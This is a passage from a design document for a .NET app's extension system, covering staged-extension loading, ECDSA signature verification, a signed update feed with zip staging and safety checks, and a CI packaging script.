`LoadOutcome` and `LoadFailure`) plus `PackSource` beside `PackStatus`. Only the Desktop head calls it;
the browser head, UiCapture and the test assembly still compile-link the pack and configure it as before.

**The directory.** Item 36 stages a downloaded extension under the config root, one directory per version:

```
<config root>/extensions/<id>/<version>/
  extension.json                            the manifest (section 7.7); id and version must equal the folder names
  DemoViewer.NET.Extensions.StratBook.dll   the assembly the manifest names
  extension.sig                             the detached signature (section 7.9) over everything else here
```

The loader reads only under `<config root>/extensions/`; it never writes, moves or deletes (item 36 owns
staging and cleanup). A directory, a manifest or an assembly that is a reparse point, or whose full path
resolves outside the extensions folder, is refused the way `PackDataRemover.ResolveSafe` refuses one
(`LoadFailure.PathEscapes`), never followed.

**The choice.** `ExtensionLoader.Resolve(configRoot, shipped, host, trust)` runs once in `Program.Main`,
after `VelopackApp.Build().Run()` and before Avalonia starts, and returns the `PackStatus` list that
`FeaturePacks.ConfigureResolved` takes. Per shipped pack:

1. `Discover` lists every `<id>/<version>/` whose manifest parses and whose folder names equal the
   manifest's id and version (`FolderMismatch` otherwise, `ManifestInvalid` for a missing or malformed
   file), ordered highest version first.
2. `Select` walks that pack's candidates from the top and takes the first that is **newer than the shipped
   version** (`NotNewer` otherwise; equal is not newer), that **`PackCompatibility.Check` accepts**
   (`Incompatible`, with the section 7.7 message), and that the **trust policy allows** (`Untrusted`).
   Every higher candidate it passed over is recorded with its reason; candidates below the chosen one are
   not examined.
3. `Load` loads the chosen assembly, resolves `entryType` by name (`EntryTypeMissing`), requires it to
   implement `IFeaturePack` with a public parameterless constructor (`NotAPack`), constructs it, and
   checks that the pack's `Id` and the version of its embedded manifest equal the on-disk manifest
   (`IdentityMismatch`). A corrupt or missing file is `AssemblyLoadFailed`.
4. Two skew checks run on the loaded copy before it is accepted. `CheckReferences` compares every assembly
   the staged copy references against the version the default context runs (the loaded assembly's, else
   the file beside the app, read without loading; `System.*`, `netstandard` and `mscorlib` come from the
   shared runtime and are skipped): a difference is `ReferenceMismatch` ("it was built against SkiaSharp
   3.119.0.0; this app ships 3.116.1.0"). `Probe` then reads `Id`, `FeatureId`, `Manifest`, `Features`,
   `Commands` and `JobKinds` and runs `Register` on a scratch `ServiceCollection`, so a member compiled
   against a type or method the running app no longer has throws here, as `ProbeFailed` ("registering its
   services failed (TypeLoadException)"), rather than later in the composition root after the loader
   reported success. What the probe does not catch: anything compiled on first use, that is the bodies of
   the lambdas `Register` and `Contribute` hand the container, `Contribute` itself, the views and the view
   models. A staged copy that passes both can still fail lazily there; the reference check narrows that to
   packages whose assembly version does not move with the package version (CommunityToolkit.Mvvm stays
   8.0.0.0 across patches; NBGV stamps the first-party assemblies at major.minor, so a patch release of
   the app is invisible to it). Section 10 decision 6 settled how much tighter to pin: (B), as built.
5. Anything that fails falls back to the shipped copy. The whole resolve is wrapped: a loader bug is a
   `LoaderFailed` outcome on the shipped pack, never a crash at startup.

Every `LoadOutcome.Detail` is in user terms and carries at most a bare file name, since Settings shows it;
the exception message behind it (which the runtime fills with the full path) rides on `LogDetail` and
reaches only the log line.

The shipped version comes from the `extension.json` the build copies beside the app
(`ShippedPack.BesideApp`), never from the type (see the constraint below). An unreadable shipped manifest
means no staged copy can be shown to be newer (`ShippedUnknown`), so the shipped copy runs. One shipped
extension per output directory for now: the copied file keeps the bare name `extension.json`, which a
second extension would collide with; renaming the copy to `<id>.extension.json` is item 37's to do with
the packaging.

**The load context.** A staged copy loads into `ExtensionLoadContext`, a named (`extension:<id>@<version>`)
non-collectible `AssemblyLoadContext` whose `Load` returns null for everything, so every reference the
extension makes (the app assembly, Avalonia, CS2DemoKit) falls through to the default context and binds to
the copy the app runs on. Only the extension's own assembly lives in the child context. No unload: "off"
is the Phase 1 switch.

This was not the first choice. The plan said "default context", and the simpler design is to load the
staged copy into `AssemblyLoadContext.Default` and skip it whenever the shipped assembly is already loaded.
A prototype against the built extension showed it cannot work: the shipped
`DemoViewer.NET.Extensions.StratBook.dll` is on the trusted platform assembly list (it is in the app
directory and the deps file), and `AssemblyLoadContext.Default.LoadFromAssemblyPath` of a same-named
assembly returns the TPA copy from the app directory, not the file named, whether or not it was loaded
before. The same prototype confirmed the other half of the trap: a method that merely mentions
`StratBookPack` on a branch not taken loads the shipped assembly when the JIT compiles the method.

**Constraints the child context imposes.**

- *Two assemblies of one name.* Once a staged copy wins, `DemoViewer.NET.Extensions.StratBook` may exist
  twice in the process: the staged one in its context, and the shipped one in the default context if
  anything resolves it by name. Nothing in the app should, but anything that does gets the shipped copy
  silently: `Assembly.Load`, `Type.GetType("..., DemoViewer.NET.Extensions.StratBook")`, and Avalonia's
  `avares://DemoViewer.NET.Extensions.StratBook/...` URIs (the asset loader resolves the authority by
  name). The extension has none of these today; `ExtensionLoaderTests.TheExtension_ResolvesNothingByAssemblyName`
  scans its source for them. The `ViewLocator` already reads `pack.GetType().Assembly`; DI, STJ, Avalonia
  properties and compiled XAML resolve by `Type`, which is the staged type.
- *The head must not name the type.* `Program.Main` passes the shipped pack as
  `ShippedPack.BesideApp(StratBookPack.PackId, static () => new StratBookPack())` (the id is a `const`,
  inlined by the compiler) and `BuildAvaloniaApp` uses `FeaturePacks.ConfigureIfUnset(static () => [...])`,
  so the only methods that mention the type are the two factories, compiled only when invoked: the loader's
  factory never when the staged copy wins, the previewer's never after Main. The shipped `StratBookPack`
  is then neither loaded, instantiated nor configured.
- *Dependencies come from the app.* A staged copy may reference only assemblies the app ships (the
  contract and CS2DemoKit ranges in its manifest cover the first-party ones); a new package reference in an
  extension release needs an app release that carries it, which items 37 and 38 enforce.
- *Internals.* The app's `InternalsVisibleTo("DemoViewer.NET.Extensions.StratBook")` matches by simple name,
  so the staged copy sees the same internals the shipped one does.

**Trust.** `ITrustPolicy.Judge(directory, manifest)` is asked once per candidate, after the compatibility
check and before the assembly is touched; a policy that throws reads as untrusted. As built (item 35,
section 7.9), `TrustPolicy.Default` trusts a directory signed by one of `PublisherKeys.Current`, or,
failing that, the developer opt-in `DEMOVIEWER_EXTENSIONS_TRUST_UNSIGNED=1` set in the process
environment, which trusts every staged copy regardless of its signature. Nothing in the app or the
installer sets the variable; it is the documented way to run an unsigned local build.

**Logging.** The loader runs before any logger exists, so it records its outcome on each `PackStatus`
(`Source`, `Rejected`) and `App.axaml.cs` writes the report once the diagnostics pillar is up, under the
`App.Extensions` category: one line per pack, `Extension Strat Book 1.0.1 loaded (installed update) from
'<dir>'` or the incompatible form, then one `Staged extension at '<dir>' not loaded (<failure>): <detail>`
per refused candidate. It lands in the Diagnostics tab and the rolling `logs/diagnostics.log`.

**The Settings surface.** `PackStatus.Source` is `PackSource.Bundled` or `PackSource.Staged(directory)`,
with a user label ("bundled", "installed update") that the pack master row shows in parentheses after
the version: `1.0.1 (installed update)`. `PackStatus.Rejected` holds every staged candidate the loader
refused for that pack, newest first; the row shows one amber line per candidate beneath the description,
`Update 1.1.0 was not loaded: Strat Book 1.1.0 needs CS2DemoKit 0.14.0; this app ships 0.13.0-beta0001`
(or `An update in '<folder>' was not loaded: ...` when its manifest did not parse). Unlike the
incompatible row of item 33 this locks nothing, since the copy that is running works. The UiCapture
variant `settings-extensions-staged` renders it. Copy says "extension" and "update", never "pack".

**Verified.** `ExtensionLoaderTests` copies the extension assembly this test process runs into a temp
`extensions/<id>/<version>/`, loads it, and asserts a second `Assembly` in an `ExtensionLoadContext` whose
pack contract type is the default context's; a manifest bumped over an unchanged assembly is an
`IdentityMismatch`; a corrupt file, a missing entry type and a non-pack entry type are reasons; a
symlinked folder or manifest is `PathEscapes`; and `Resolve` with a shipped manifest that says 0.9.0 loads
the 1.0.0 copy on disk without ever invoking the shipped factory. The published Desktop head
(`dotnet publish -c Release -r osx-arm64`) was run three times under temp config roots: with a staged
1.0.1 (the extension rebuilt with its manifest bumped) and the opt-in set, the log read `Extension Strat
Book 1.0.1 loaded (installed update) from '<root>/extensions/net.demoviewer.pack.stratbook/1.0.1'` and
the pack's index loads followed from the staged code; with nothing staged, `Strat Book 1.0.0 loaded
(bundled)`; with the same staged copy and no opt-in, `loaded (bundled)` followed by `Staged extension at
'<dir>' not loaded (Untrusted): the copy is not signed by this app's publisher`.

### 7.9 Signing and trust (as built by item 35)

Everything here lives in the app under `DemoViewer.NET.Extensions.Loading` (`ExtensionSignature`,
`PublisherKeys`, `SignedTrustPolicy`, and `TrustVerdict` and `TrustPolicy.SignedOrOptIn` beside
`ITrustPolicy`); a signing tool at `tools/extension-signing` links the first two files rather than
referencing the app.

**Algorithm.** ECDSA P-256 with SHA-256, not Ed25519. .NET 10's `System.Security.Cryptography` has no
standalone Ed25519 sign or verify: the only Ed25519-related surface is the composite
ML-DSA-with-Ed25519 hybrid tied to `MLDsa`, not a plain signer. `ECDsa` is the asymmetric signer the
runtime ships without pulling in a third-party package, so that is what this uses. Signatures use the
fixed-length IEEE P1363 encoding
(`DSASignatureFormat.IeeeP1363FixedFieldConcatenation`), 64 bytes for P-256, never the DER form, so the
byte length alone is a cheap sanity check.

**The canonical digest** (`ExtensionSignature.ComputeDigest`). Every file under the staged directory,
recursive, except a top-level `extension.sig`, hashed with SHA-256 in one deterministic order:

1. An 8-byte little-endian file count.
2. Per file, ordinal by its `/`-separated relative path (never the OS separator, so the same tree
   hashes the same on Windows and on macOS/Linux): an 8-byte little-endian length and the path's UTF-8
   bytes, then an 8-byte little-endian length and the file's content bytes.

Both lengths are prefixed, not just the content's, because a bare concatenation of variable-length
fields is ambiguous (`"ab"` then `"c"` hashes the same as `"a"` then `"bc"` without one). The walk is
manual, never `Directory.EnumerateFiles(..., AllDirectories)`: every entry, file or directory, is
checked for a reparse point before it is used, and refused (`ExtensionSignatureException`) rather than
followed, matching the loader's own rule for the staged folder one level up. `EnumerationOptions` sets
`AttributesToSkip = 0`; the default skips `Hidden`, and .NET marks a Unix dotfile `Hidden`, so leaving
the default in place would let an added dotfile hide from the digest. It also sets
`IgnoreInaccessible = false`: that property defaults to true, which silently skips an entry the process
cannot read instead of throwing, exactly the gap that would let part of a tampered tree go unhashed
with no reason at all; with it off, an unreadable file or directory anywhere in the tree is a reason,
not a silent omission, and the enumeration itself (not only the per-entry attribute read after it) is
inside the same guard, since it can throw mid-walk, a directory disappearing or a permission revoked
under it, not only at the first call. The walk also refuses more than `MaxFiles` (2000) files or more
than `MaxTotalBytes` (512 MB) total content, checked from `FileInfo.Length` before a file is opened, so
a tree that is too big to safely hash fails fast rather than streaming hundreds of megabytes first.
This is the form item 37's CI step must reproduce byte for byte; nothing about it is specific to this
tool, and the tool and the app compile the identical source file (see below), so there is only one
implementation to keep in sync.

**`extension.sig`** is JSON beside `extension.json`:

```json
{
  "alg": "ECDSA-P256-SHA256",
  "keyId": "<lowercase hex, SHA-256 of the signer's SubjectPublicKeyInfo DER>",
  "digest": "<base64, the 32-byte canonical digest at signing time>",
  "signature": "<base64, the 64-byte IEEE P1363 signature>"
}
```

The JSON encoding itself needs no cross-tool agreement; only the signed message does. The signature is
over a fixed ASCII domain tag (`"DemoViewer.NET extension signature v1"`) followed by the digest bytes,
never the bare digest, so this key is never asked to verify some other 32-byte message as if it were
this one.

**Verification order matters.** `ExtensionSignature.Verify(directory, publisherKeysBase64Spki)`:

1. Missing `extension.sig` → `Missing`, detail "the copy is not signed by this app's publisher".
2. Not valid JSON, or a required field missing or not valid base64 → `Malformed`, detail "signature
   invalid".
3. `keyId` matches none of the given keys → `UnknownKey`, detail "the copy is not signed by this app's
   publisher" (collapsed with `Missing`: from the app's side, a key it does not recognize is the same
   fact as no signature at all).
4. The signature does not verify against the matched key, over the **recorded** digest → `SignatureInvalid`,
   detail "signature invalid".
5. Only once the signature has verified does `Verify` recompute the digest from the directory as it is
   now and compare; a mismatch → `DigestMismatch`, detail "a file changed after signing". A cap exceeded
   or a link found during that recompute reads the same way, since signing enforces the identical caps
   and refusals, so a tree that trips one now could not have been the one that was signed.

The order is load-bearing: the recorded digest inside `extension.sig` is attacker-controlled data until
the signature over it verifies, so nothing compares it to the live directory before that. This also
means a wrong key and a changed file are handled as two different buckets (steps 3 and 5), never
conflated into one ambiguous "didn't verify". The two are genuinely distinguishable here because the
signature names the key it claims, not because the math alone could tell them apart.

Every failure path is a `SignatureCheck`, never an exception; `ComputeDigest` itself throws
`ExtensionSignatureException` (a cap, a link, or an I/O error), and `Verify` catches that case by case
rather than letting it escape. `Verify` never throws.

**The app's seam.** `ITrustPolicy` gained a second, default-implemented member,
`TrustVerdict Judge(directory, manifest)`. No pack references or implements anything under
`Extensions.Loading` (item 38 names `Loading` explicitly as a host-side area that "changes freely"),
so per the contract rule in section 7.7 this needs no `ContractVersion` bump, the same reasoning
`CompatibilityReport.Describe` above it relies on. `IsTrusted` is unchanged, so every policy written
before item 35 still compiles and reports the one generic reason it always gave; `ExtensionLoader.Select`
now calls `Judge`, not `IsTrusted`, and copies its `Reason`/`LogDetail` onto the `Untrusted` `LoadOutcome`.

`SignedTrustPolicy(publicKeysBase64Spki = null)` calls `ExtensionSignature.Verify` against
`PublisherKeys.Current` by default, or an injected list for a test. `TrustPolicy.Default` is
`SignedOrOptIn(PublisherKeys.Current, <the real environment>)`: signed trust first, the developer opt-in
second, and on a full refusal the reported reason is the **signing** failure's, not "the opt-in wasn't
set", since that is the one a user or the log can act on. Neither key parsing nor a file read happens
at type load: `PublisherKeys.Current` is a plain list of base64 strings, and both policies underneath
`Default` are only ever asked inside the loader's own try/catch, so a bad embedded key constant cannot
fail the process at startup, only that one candidate at judge time. The opt-in itself still does not
look at the directory at all, signed or not: setting `DEMOVIEWER_EXTENSIONS_TRUST_UNSIGNED=1` bypasses
even a directory signed by a key this build does not know, exactly as it bypassed an unsigned one
before item 35. That is unchanged from item 34 and is why the variable is documented as a developer
bypass, not a narrower "only when truly unsigned" rule.

**`PublisherKeys`.** SubjectPublicKeyInfo, base64, one constant (`Primary`) today, in a list
(`Current`) so rotation adds a key ahead of retiring one: a signature verifies if any listed key
verifies it. The public key in this repo today has key id
`dfe4ae3ebb28794fb79a03562ad36eaf252ebe1753292574e752bad4bc1c4cc0`, generated 2026-10-03.

**The signing tool**, `tools/extension-signing` (out of the `.slnx`, a CI and command-line utility rather than an
app component, following the `NavPathSpike` convention of a comment saying so plus relaxed analyzer
settings):

```
extension-signing keygen --out <private.pem>              generates an ECDSA P-256 key pair; the
                                                           private key is created at <private.pem>
                                                           already mode 600 off Windows (the create
                                                           mode is set on the open, not chmod'd after),
                                                           and the public half prints as a
                                                           PublisherKeys.cs constant plus its key id
extension-signing sign <dir> --key <private.pem> [--force] writes <dir>/extension.sig; refuses to
                                                           overwrite one that is already there
                                                           unless --force is given
extension-signing verify <dir>                            checks <dir>/extension.sig against
                                                           PublisherKeys.Current
```

`<AssemblyName>` is `extension-signing`, so a publish produces that binary name; from source,
`dotnet run --project tools/extension-signing -c Release -- <command> ...` runs the same thing.

It links `Extensions/Loading/ExtensionSignature.cs` and `PublisherKeys.cs` from the app via MSBuild
`<Compile Include="..." Link="..."/>`, not a project reference, so the tool and the app run the exact
same digest and verify code without pulling Avalonia into a CI utility, and there is one implementation
to keep correct rather than two to keep in sync. Verified by hand (2026-10-03): signed a staged
directory with a freshly generated key, verified it clean, then independently reproduced each of the
four failure buckets (missing, malformed, wrong key, one byte flipped after signing) against the real
tool and the real embedded key.

**Action before the first release.** The matching private key is not in this repo, not even on a branch that stays
unpushed: it was generated with `keygen` and written to a path under a home directory, outside
every git working tree, with owner-only permissions. Before item 37 wires a release workflow
that signs the shipped extension automatically, store that private key's PEM contents as the
GitHub repository secret `DV_EXTENSION_SIGNING_KEY`, the same pattern the existing `DV_SIGN_*` /
`DV_NOTARY_PROFILE` secrets already use in `release.yml` (unset today; wired via repo secrets before that
release). Rotating the key is `keygen` again, adding the new public constant to
`PublisherKeys.Current` ahead of removing the old one (so an extension signed with the old key still
loads until every shipped build has the new constant), then updating the stored secret once releases
move to the new key.

**What item 36 must not leave behind.** Because the digest covers the whole tree, nothing may land in
`<id>/<version>/` beside the files `extension.sig` actually signs: no staging marker, no temp file left
over from an interrupted download, no `.DS_Store`, no `__MACOSX/` from a zip extracted on macOS. Any of
those reads as "a file changed after signing" by construction, since it was never part of what was
hashed. Item 36's staging step must write the signed files and nothing else into the version directory,
or clean up anything it used to get them there before the loader ever sees it.

**Tests.** `src/App/DemoViewer.NET.App.Tests/Extensions/ExtensionSignatureTests.cs`: sign-then-verify
round trip with a key generated in process; a byte change, a rename, an added file, a removed file, and
a wrong key each fail with the detail named above; a forged digest (rewritten to match a tampered tree)
and a spoofed key id (naming a key that never signed anything) both still fail, since the order of
checks never compares digests before the signature over them verifies; a listed key on another curve
(P-384) is skipped rather than handed to `VerifyData`; a subdirectory made unreadable mid-walk (chmod
000, skipped on Windows and under an account that can read it anyway) is a reason, never a thrown
exception, both through `ComputeDigest` directly and through `Verify`; the canonical digest is identical
across two runs and independent of the files' creation order; a dotfile changes the digest; both caps
are enforced; a symlinked file inside the tree is refused. `SignedTrustPolicyTests.cs`: a missing
signature is untrusted with the generic reason; a valid one is trusted; `Default` itself (not just
`SignedOrOptIn` with an injected key) refuses a directory signed with a key outside
`PublisherKeys.Current`; `SignedOrOptIn` trusts a signed directory without the env var, trusts an
unsigned one only with it, and (a documented edge, not a new rule) the opt-in still bypasses a directory
signed by the wrong key since it does not inspect the directory at all; `PublisherKeys.Current`'s one
entry imports as a NIST P-256 key. `ExtensionLoaderTests.cs` gained two cases: `Resolve` loads a staged
copy of the real extension signed with a freshly generated key, no env var set; the same staged copy
with one byte flipped in the DLL is rejected as `Untrusted` with detail "a file changed after signing".
No test commits a private key; every test that signs something generates its own ephemeral key pair and
injects the matching public half.

---

### 7.10 Update feed and staging (as built by item 36)

Everything here lives in the app under `DemoViewer.NET.Extensions.Updates` (`ExtensionFeed` and
`ExtensionFeedEntry`, `IExtensionFeedClient` and `HttpExtensionFeedClient`, `ExtensionFeedSource`,
`ExtensionUpdateService`, `ExtensionUpdateState` and `StageResult`, `ExtensionStaging`) plus
`ViewModels/Settings/ExtensionUpdateRow`. Only the Desktop head constructs the service: the browser has no
config root to stage into, and its Settings line says updates come with the app. The service loads
nothing; a staged copy is what item 34's loader takes at the next start.

**The feed.** One `extensions.json` per extension, hosted as a GitHub release asset. The default URL is
`https://github.com/<owner>/<repo>/releases/download/extensions-<id>/extensions.json`, with the repository
from the constant `GitHubReleaseNotesService` already reads (`ExtensionFeedSource.DefaultTemplate`): one
rolling release per extension, tagged `extensions-<id>`, whose asset item 37's workflow replaces on every
extension release. The setting `Extensions.FeedUrl` may name another https URL, with `{id}` standing for the
extension id; anything that is not https falls back to the default. The feed's origin is not the gate:
the signed zip is what the trust policy judges.

```json
{
  "id": "net.demoviewer.pack.stratbook",
  "entries": [
    {
      "version": "1.0.1",
      "manifest": { ...the extension.json inside the zip, verbatim... },
      "url": "https://github.com/<owner>/<repo>/releases/download/net.demoviewer.pack.stratbook-v1.0.1/DemoViewer.NET.Extensions.StratBook-1.0.1.zip",
      "sha256": "<64 hex characters, the zip's SHA-256>",
      "size": 4718592,
      "publishedAt": "2026-10-03T12:00:00Z"
    }
  ]
}
```

| Member | Required | Meaning |
|---|---|---|
| `id` | yes | The extension id; every entry's manifest must carry it. Only `[A-Za-z0-9._-]`, since it names a folder. |
| `entries` | yes | Every published version, in any order; parsed highest first. At most 500. |
| `entries[].version` | yes | SemVer 2.0; must equal the manifest's `version`. No two entries share one. |
| `entries[].manifest` | yes | The section 7.7 manifest, so the app can judge a version before downloading it. Parsed by the same strict parser; must name `id`. |
| `entries[].url` | yes | The zip, an absolute https URL. |
| `entries[].sha256` | yes | The zip's SHA-256, hex, either case. |
| `entries[].size` | yes | The zip's length in bytes, positive. |
| `entries[].publishedAt` | no | An ISO 8601 timestamp. |

Unknown members are ignored, comments and trailing commas accepted, so a newer feed reads on an older
app. The feed is capped at 4 MB before it is parsed.

**The zip item 37 must produce.** Flat, with the manifest at the root, exactly what the loader expects
under `extensions/<id>/<version>/`:

```
DemoViewer.NET.Extensions.StratBook.dll   the assembly the manifest names
DemoViewer.NET.Extensions.StratBook.xml   its documentation file, when built
extension.json                            the manifest; id and version equal the feed entry's
extension.sig                             item 35's signature over the directory
<culture>/...                             any satellite directories, kept as they are
```

Nothing is renamed, dropped or added on the way to disk: the signature item 35 verifies at load is the
signature that came out of the zip. A zip is refused for more than 4096 entries, more than 512 MB of
content (the feed's `size` is held to the same cap), an entry whose stream is longer than it declares,
an entry whose Unix mode bits say symlink (`ZipArchive` would write the target text as a file; refused
anyway), two entries whose names differ only by case (one file on macOS and Windows), or an entry whose
name is rooted, carries a drive letter, a `..`, `.` or empty segment (split on both separators, since a
Windows-written zip may carry backslashes and on Unix a backslash is a legal file-name character), or
that resolves outside the target directory. The id rule is one constant for the manifest and the feed
(`ExtensionManifest.IsValidId`): a leading dot is refused at parse time, not hidden by the loader's dot
folder skip.

**The check.** `ExtensionUpdateService.CheckAsync` fetches every declared extension's feed as one queue
item at user priority (the user pressed the button or opened Settings) and computes one
`ExtensionUpdateState` per pack. Installed is the running copy's manifest version and `PackSource`.
Offered is the highest entry newer than installed that `IsOffered(entry, host)` accepts. Latest is the
highest entry overall, offered or not, with `LatestCompatibility` when it is newer and not offered, so
Settings can say what a newer version needs. Pending is a version already staged on disk that the loader
would take at the next start: the highest `extensions/<id>/<version>/` above the running version that
passes the section 7.7 check. The status, in order of precedence: `UpdateAvailable` when something is
offered and it is newer than any pending copy; `PendingRestart` when a pending copy exists; `NeedsNewerApp`
when the latest is newer and nothing is offered; else `UpToDate`. A feed that cannot be fetched is
`FeedUnreachable` and one that does not parse, or is for another extension, is `FeedInvalid`, each with a
user-terms `Error` and the exception message on `LogDetail` for the log only; a pack whose own manifest
did not read is `Unknown`. Nothing throws. The service remembers the last state per pack for the run
(`LastStates`, `LastState(id)`).

**Decision 6's predicate.** `IsOffered` is the one place decision 6 (section 10) lands.
`ExtensionUpdateService.DefaultIsOffered` is option (B): `PackCompatibility.Check(entry.Manifest, host)`
accepts it. Option (A) replaces the predicate passed to the constructor with one that reads the
CI-written `builtAgainst` block from the entry's manifest and compares it with the running versions; the
loader's own check (section 7.8) gets the matching change. Nothing else in the service or in Settings
knows which option is in force. A predicate that throws offers nothing.

**Download and staging.** `DownloadAndStageAsync(entry)` is one queue item at user priority, cancellable,
and never throws; it returns a `StageResult` of `Installed`, `AlreadyInstalled`, `Refused` (with the
reason in user terms) or `Cancelled`. In order:

1. `extensions/<id>/<version>/` already exists: `AlreadyInstalled`, nothing is fetched or changed.
2. The zip streams to `extensions/.staging/<id>/<version>.zip.part`, bounded by the feed's `size` (the
   client stops at one byte over and refuses a `Content-Length` above it). The `HttpClient`'s own timeout
   is off, since it would span the body too; the headers get 30 s, and the body a 60 s stall budget per
   read, so a slow download that keeps arriving completes. Progress (bytes received of total) reaches the
   Settings row and the queue item.
3. The file's length must equal `size`, then its SHA-256 must equal `sha256`. Nothing is opened before
   both pass.
4. The zip unpacks into `extensions/.staging/<id>/<version>/` under the rules above, planned before anything
   is written.
5. `extension.json` must exist at the root, parse, name the entry's id and version, and the assembly it
   names must be beside it.
6. The loader's `ITrustPolicy.Judge` (`TrustPolicy.Default`, the same value `Program.Main` hands the
   loader: section 7.9's signature check, or the developer opt-in) is asked about the unpacked directory
   and its manifest. A refusing verdict's `Reason` is the refusal detail Settings shows ("a file changed
   after signing", "signature invalid", ...) and its `LogDetail` goes to the log; a policy that throws
   reads as untrusted.
7. One `Directory.Move` to `extensions/<id>/<version>/`. A target that appeared in the meantime is
   `AlreadyInstalled`. The `.zip.part` and the empty `.staging/<id>/` go.

Any refusal or error removes the `.zip.part` and the unpacked directory; a cancellation does the same.
Every delete is guarded the way `PackDataRemover.ResolveSafe` guards (strictly inside `extensions/`, never
through a reparse point, never a `.dem`), and `ExtensionLoader.Discover` skips dot folders, so an
unfinished download is never reported as a broken candidate.

**At startup.** `CleanupOnStartAsync`, a background queue item from the composition root after the
loader's report: removes `extensions/.staging/` whole (a download the last run did not finish), then every
staged version of a declared extension that is not newer than the running copy and is not the directory
the running copy loaded from. Newer versions stay, even ones the loader refused today, since they may load
after an app update. Nothing outside `extensions/` is touched.

**Settings.** Under Extensions, each extension's master row carries one update line (`FeatureToggleRow.Update`,
an `ExtensionUpdateRow`): the verdict, a Check button (always, unless a download runs), an Update button
while a version is offered, a Cancel button and a progress bar while one downloads. Opening Settings checks
every feed when `Extensions.LastUpdateCheckUtc` is unset or at least an hour old, and records the time
after every finished check; within the hour the rows seed from the service's remembered verdict. The copy,
one sentence per state:

| State | Line |
|---|---|
| not checked this run | (empty; the Check button is the invitation) |
| checking | `Checking for updates…` |
| `UpToDate` | `Up to date.` |
| `UpdateAvailable` | `1.0.1 available.` and the Update button |
| downloading | `Downloading 1.0.1: 1.2 of 4.5 MB`, the bar and Cancel |
| `PendingRestart` (and after a successful download) | `1.0.1 installed, restart to use it.` |
| `NeedsNewerApp` | `1.2.0 available but needs app contract ^2.0 (this app provides 1.0.0).`, or the CS2DemoKit or app-release form |
| `FeedUnreachable` | `Could not check for updates: the update feed could not be reached.` |
| `FeedInvalid` | `Could not check for updates: the update feed could not be read.` |
| `Unknown` | `Updates cannot be checked: the extension's own manifest could not be read.` |
| a refused download | the offer stands, plus an amber `Update 1.0.1 could not be installed: <reason>.` |
| browser head | `Updates come with the app.`, no buttons |

Copy says "extension" and "update", never "pack". The UiCapture variants
`settings-extensions-update-available` and `settings-extensions-update-installed` render the two states
users will meet most.

**Logging.** Under `App.Extensions`: `Extension <id> update check failed (<status>): <detail>`,
`Extension <name> <version> staged at '<dir>'; it loads at the next start`,
`Extension <name> <version> update refused: <detail> [<exception>]`, and
`Removed staged extension directory '<dir>' (<reason>)` from the startup sweep.

**Verified.** `ExtensionFeedTests` (the schema and every refusal), `ExtensionUpdateServiceTests` (every
check state, the decision-6 predicate as the only gate, wrong sha and size, five zip-slip shapes, a
missing or mismatched manifest, an untrusted copy with the staging directory gone, a successful stage with
every file intact and `PendingRestart`, an existing target as a no-op, a cancellation leaving no partial
file, every step a user-priority `ExtensionUpdate` queue item, the startup sweep keeping the running and
newer copies, and the real extension output zipped and signed with an ephemeral key installing through a
`SignedTrustPolicy` while the same zip with one byte of the DLL changed after signing is refused with the
signature check's reason), one `ExtensionLoaderTests` case that stages through the service and discovers the result
while ignoring `.staging`, and the Settings cases in `SettingsViewModelTests`.

---

### 7.11 CI and packaging (as built by item 37)

**`scripts/pack-extension.sh <id> [--key <private.pem>] [--dry-run] [--out <dir>]`.** Bash, runs the same
way locally and in CI. In order:

1. Reads the host values this build offers (`ContractVersion`'s literal from `ExtensionHost.cs`, the
   `CS2DemoKit.Analysis` pin from `Directory.Packages.props`) from source rather than keeping its own
   copy, and fails if either grep does not find exactly one match.
2. Reads the manifest's own `version` and `assembly`; if `GITHUB_REF` is `refs/tags/extensions/<id>/v*`,
   the tag's version must equal the manifest's (pack-velopack.sh's own tag/version guard, same shape);
   otherwise the check is skipped, not failed, since a dispatch run or a local invocation names no tag.
3. Builds `tools/extension-signing` and the extension project (`dotnet build`, Release, no `-r`:
   framework-dependent, AnyCPU, since the extension is managed-only and loads into the app's process on
   every OS).
4. Stages exactly what the extension project itself produces. The built `.deps.json`'s own entry for
   the project (keyed `<AssemblyName>/<nbgv-version>`) lists, under `runtime` and `resources`, only the
   files that project's own compile output contributes; every referenced project and package is a
   separate entry, never folded in. The script copies every path each of those two lists names (not a
   hardcoded `<AssemblyName>.dll`), so this is "the project's own output minus every reference" without
   hand-walking a reference closure. A `native` or `runtimeTargets` key on that same entry would mean a
   RID-specific asset the extension itself ships, which this script refuses to package, stopping with an
   error rather than shipping a half-correct zip (the shipped extension has none today). The `.xml` doc
   file is staged separately when the build produced one (`deps.json` does not track it); the manifest
   staged is the repo copy, not the build's `PreserveNewest` copy beside the DLL, though the next step
   proves them equal.
5. Reads the manifest embedded in the built DLL (`extension-signing manifest <dll>`, straight out of the
   PE's resource metadata, no assembly load, written with `Console.Out.Write` rather than `WriteLine` so
   the output carries no extra trailing newline the embedded text did not already have) and `cmp`s it
   byte for byte against the repo file, never a string compare through `$(...)` (which would silently
   swallow a trailing-newline difference).
6. Prints `CompatibilityReport.Describe` for the manifest against the host values from step 1
   (`extension-signing report <manifest.json> --contract <ver> --cs2demokit <ver>`) and fails the whole
   run if it is not compatible: a release workflow should not ship a pairing it already knows cannot
   load.
7. Signs the staged directory. `--dry-run` never reads `DV_EXTENSION_SIGNING_KEY`, signed or not: a
   dry run signs only with an explicit `--key` (expected to be an ephemeral `extension-signing keygen`
   key, never in `PublisherKeys.Current`, so verification is told to check against that key's own
   public half instead), so the production key can never end up on an unpublished artifact even if a
   caller sets the secret alongside `--dry-run`. A real run reads `DV_EXTENSION_SIGNING_KEY` into a
   `mktemp` file (`chmod 600`, removed by a `trap ... EXIT`) and verifies with no override, against
   `PublisherKeys.Current`, so a secret that is not the key behind `Primary` fails here rather than
   shipping a zip no app will trust. A real run with no key available fails outright with the action
   below; a dry run with none notes it and ships an unsigned zip.
8. Zips the staged directory deterministically (`extension-signing zip`, `DeterministicZip` below:
   entries sorted ordinal by `/`-path, every entry's timestamp fixed to 1980-01-01 and its Unix mode
   normalized to `0644`, no directory entries) to
   `<out>/<AssemblyName>-<version>.zip`, then unzips it to a scratch directory and diffs its file list
   against the staged one and (when signed) re-verifies the unzipped copy: the loader extracts this
   archive, not the staged directory, so a zip-tool bug would otherwise go unnoticed. Writes
   `<zip>.sha256` as `<hex>  <name>`, the form `sha256sum -c` reads.
9. Emits the feed entry fragment (version, the manifest verbatim, the computed release-asset url, the
   zip's sha256 and size, `publishedAt`) to `<out>/feed-entry.json`, the exact shape `ExtensionFeedEntry`
